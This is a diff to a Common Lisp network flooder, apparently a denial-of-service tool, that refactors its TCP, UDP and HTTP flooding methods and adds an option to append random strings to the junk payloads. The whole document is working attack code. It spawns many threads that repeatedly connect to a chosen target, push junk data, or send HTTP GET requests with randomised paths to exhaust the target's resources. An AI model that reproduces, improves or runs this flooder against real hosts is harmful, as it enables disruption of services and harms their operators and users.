@@ -16,7 +16,8 @@
    (threads)))
 
 (defclass xxp-flooder (flooder)
-  ((data :type string :initform ":P" :accessor data)
+  ((data :type string :initform ":P" :initarg :data :accessor data)
+   (random-data :type boolean :initform nil :initarg :random-data :accessor random-data)
    ; Statistics
    (flood-count :type integer :initform 0 :reader flood-count)))
 
@@ -37,22 +38,18 @@
 (defun random-string (&optional (min 5) (max 10))
   "Create a random string of given size"
   (let ((size (+ (random (- max min -1)) min)))
-    (coerce (loop :for i :below size
+    (coerce (loop :repeat size
                   :collect (code-char (+ (random 26) 65)))
             'string)))
 
-(defun hostname->address (hostname)
-  "Resolve hostname or parse ip string into an ip vector"
-  (host-ent-address (get-host-by-name hostname)))
-
 (defun make-thread (function)
   "Spawns a thread"
-  #+ecl  (mp:process-run-function "flooder" function)
-  #+sbcl (sb-thread:make-thread function))
+  #+ecl   (mp:process-run-function "flooder" function)
+  #+sbcl  (sb-thread:make-thread function))
 
 (defun listen-with-timeout (stream timeout)
   "Returns t if stream becomes readable in specified time"
-  (loop :for i :below timeout
+  (loop :repeat timeout
         :until (listen stream)
         :do (sleep 1))
   (listen stream))
@@ -66,55 +63,57 @@
     (when (> delay 0)
       (sleep delay))))
 
+;; make-spam
+
+(defgeneric make-spam (flooder) (:documentation "Makes flooder-specific spam to send"))
+
+(defmethod make-spam ((flooder xxp-flooder))
+  (format nil "~A~@[~A~]" (data flooder) (when (random-data flooder) (random-string))))
+
 ;; flood
 
 (defgeneric flood (flooder) (:documentation "Do the flooding"))
 
 (defmethod flood ((flooder tcp-flooder))
   (loop :while (is-flooding flooder)
-        :do (handler-case (let ((socket (make-instance 'inet-socket
-                                                       :protocol :tcp
-                                                       :type :stream)))
-                            (socket-connect socket (hostname->address (target-ip flooder)) (target-port flooder))
+        :do (handler-case (let* ((socket (socket-connect (target-ip flooder) (target-port flooder)
+                                                         :protocol :stream))
+                                 (stream (socket-stream socket)))
                             (loop :while (is-flooding flooder)
-                                  :while (socket-open-p socket)
-                                  :do (socket-send socket (string-to-utf-8-bytes (data flooder)) nil)
+                                  :do (princ (make-spam flooder) stream)
+                                  :do (force-output stream)
                                   :do (delay flooder))
-                            (when (socket-open-p socket)
-                              (socket-close socket)))
+                            (socket-close socket))
               (socket-error (c) nil))
         :do (delay flooder)))
 
 (defmethod flood ((flooder udp-flooder))
-  (loop :while (is-flooding flooder)
-        :do (handler-case (let ((socket (make-instance 'inet-socket
-                                                       :protocol :udp
-                                                       :type :datagram))
-                                (data (string-to-utf-8-bytes (data flooder))))
-                            (socket-connect socket (hostname->address (target-ip flooder)) (target-port flooder))
-                            (loop :while (is-flooding flooder)
-                                  :do (socket-send socket data nil)
-                                  :do (delay flooder))
-                            (socket-close socket))
+  (let ((data (format nil "~A~@[~A~]" (data flooder) (when (random-data flooder) (random-string)))))
+    (loop :while (is-flooding flooder)
+          :do (handler-case (let ((socket (socket-connect (target-ip flooder) (target-port flooder)
+                                                          :protocol :datagram)))
+                              (loop :while (is-flooding flooder)
+                                    :do (socket-send socket (make-spam flooder) nil)
+                                    :do (delay flooder))
+                              (socket-close socket))
               (socket-error (c) nil))
-        :do (delay flooder)))
+          :do (delay flooder))))
 
 (defmethod flood ((flooder http-flooder))
   (loop :while (is-flooding flooder)
-        :do (handler-case (let ((data (format nil "GET ~A~@[~A~] HTTP/1.0~%~%~%"
-                                              (subsite flooder)
-                                              (when (add-random-subsite flooder) (random-string))))
-                                (socket (make-instance 'inet-socket 
-                                                       :protocol :tcp
-                                                       :type :stream)))
-                            (socket-connect socket (hostname->address (target-ip flooder)) (target-port flooder))
-                            (socket-send socket data nil)
+        :do (handler-case (let* ((data (format nil "GET ~A~@[~A~] HTTP/1.0~%~%~%"
+                                               (subsite flooder)
+                                               (when (add-random-subsite flooder) (random-string))))
+                                 (socket (socket-connect (target-ip flooder) (target-port flooder)
+                                                         :protocol :stream))
+                                 (stream (socket-stream socket)))
+                            (princ data stream)
+                            (force-output stream)
                             (incf (slot-value flooder 'requested))
-                            (if (listen-with-timeout (socket-make-stream socket :input t) (timeout flooder))
+                            (if (listen-with-timeout socket (timeout flooder))
                               (incf (slot-value flooder 'downloaded))
                               (incf (slot-value flooder 'failed)))
                             (socket-close socket))
-              (sb-int:simple-stream-error (c) nil)
               (socket-error (c) nil))
         :do (delay flooder)))
 
@@ -139,7 +138,7 @@
   (unless (is-flooding flooder)
     (setf (slot-value flooder 'is-flooding) t)
     (setf (slot-value flooder 'threads)
-          (loop :for i :below (connections flooder)
+          (loop :repeat (connections flooder)
                 :collect (make-thread (lambda () (flood flooder)))))
     t))
 
